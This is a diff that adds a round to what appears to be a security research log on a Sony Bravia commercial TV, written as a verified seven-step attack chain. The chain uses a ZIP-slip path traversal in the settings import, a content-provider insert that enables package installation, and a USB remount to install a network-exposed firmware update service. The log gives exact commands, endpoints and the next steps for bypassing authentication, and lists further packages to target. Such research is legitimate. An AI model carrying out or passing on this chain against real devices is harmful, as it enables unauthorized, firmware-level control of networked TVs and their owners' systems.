@@ -662,3 +662,83 @@ The `settings/*` bridge methods crashed because:
 | 2 | SCREEN_STATE_ERROR |
 | 3 | INVALID_MODEL_VARIATION |
 | 4 | INVALID_FILE (our test zips) |
+
+---
+
+# Round 18 (2026-11-14): NETWORK-DRIVEN PRIVILEGED APP INSTALLATION — FULL CHAIN
+
+## The complete attack chain (all 7 steps verified)
+
+```
+1. Webui digest auth (admin password we set via PasswordActivity)
+2. ZIP-SLIP: path traversal in settings import writes BPK to USB stick
+   └─ POST /api/import with entry ../../../../../../storage/2218-68D6/extapp_installer.pkg
+   └─ MD5 verified on device: 7bb5db1369fe39dd8360345ef909032d
+3. Hotel settings provider: bpk_installation = On
+   └─ content insert --uri content://com.sony.dtv.b2b.hotelsettings/hotel
+4. USB re-mount: sm unmount/mount public:8,0
+   └─ usbmsgservice chain fires
+5. AppInstallerCore processes the BPK (Sony's own signed package)
+6. extapp_basic_installer3 UI shows on TV (one remote-button confirm)
+7. → REMOTE FIRMWARE UPDATE SERVICE INSTALLED AND RUNNING
+   └─ NodeProcessService1 exec: remote-firmware-update-service/index.js
+   └─ Listening on [::]:20335 (ALL INTERFACES)
+```
+
+## What was installed
+
+**com.sony.tv.b2b.app.remote_firmware_update_service v2.2.1**
+- Express server on port 20335 (all interfaces — directly network-exposed!)
+- API: `/firmware/api/v1/{information,version,requests}` (POST/GET/PUT/DELETE)
+- TvClient bridge methods: startFirmwareUpdate, cleanupFwWrite, reboot,
+  getFirmwareVersion, enableDryRunMode, isAbUpdateSupported
+- Source decrypted offline: 3.6MB, MD5 verified
+- The `url` parameter in firmware requests = firmware download URL
+- DryRun modes: 0=none, 1=offerpayload only, 2=full
+
+## The remaining gate: IP Control authentication
+
+The firmware service's auth middleware reads the TV's IP Control auth mode
+via bridge `system/getIpControlAuthentication` (returns `{"auth":0,"psk":""}`).
+Auth mode 0 matches NO allowed case (1=none, 2/3=PSK) → all requests 403.
+
+**Fix**: set IP Control auth mode to 1 (none) via:
+- `system/setIpControlAuthentication` bridge call (crashed the webui when we
+  tried — likely same NPE pattern as settings/*), OR
+- ProSettingsService `setIPControl({authentication_mode: 1})` via probe, OR
+- The TV's Pro Settings menu (IRCC remote)
+
+## The BPK installation gate (SOLVED)
+
+`isBpkUsbAutoRunPermitted()` checks hotel setting `bpk_installation`:
+- NULL (provider missing) → permitted (how the webui originally installed)
+- "On" → permitted
+- "Off" → BLOCKED
+
+After enabling hotelmode package, the setting defaulted to "Off".
+Fixed via: `content insert --uri content://com.sony.dtv.b2b.hotelsettings/hotel
+--bind name:s:bpk_installation --bind value:s:On` (exact case "On" required).
+
+## Sony BPK inventory (all in NodeRuntimePrivilege assets/preinstall/)
+
+| BPK | Size | Status |
+|-----|------|--------|
+| bravia-web-control-ui | 11.4MB | INSTALLED (round 11) |
+| remote_firmware_update_service | 874KB | INSTALLED (this round) |
+| bravia-updater | 8.2MB | NOT INSTALLED |
+| crestronconnected | 6.6MB | NOT INSTALLED |
+
+All four can be installed via the same network-driven chain.
+
+## Remaining BPKs worth exploring
+
+- **bravia-updater**: system updater — potentially firmware-level access
+- **crestronconnected**: commercial AV control — likely IR/power/config access
+
+## Webui crash/recovery notes
+
+- `system/setIpControlAuthentication` bridge call crashed the webui (NPE pattern)
+- After `am force-stop`, the app enters "stopped" state; services can't be
+  restarted from shell ("app is in background uid null")
+- BootReceiver is not exported; `pm disable` blocked (signature-protected)
+- **Recovery: reboot the TV** — all node services auto-start, settings persist
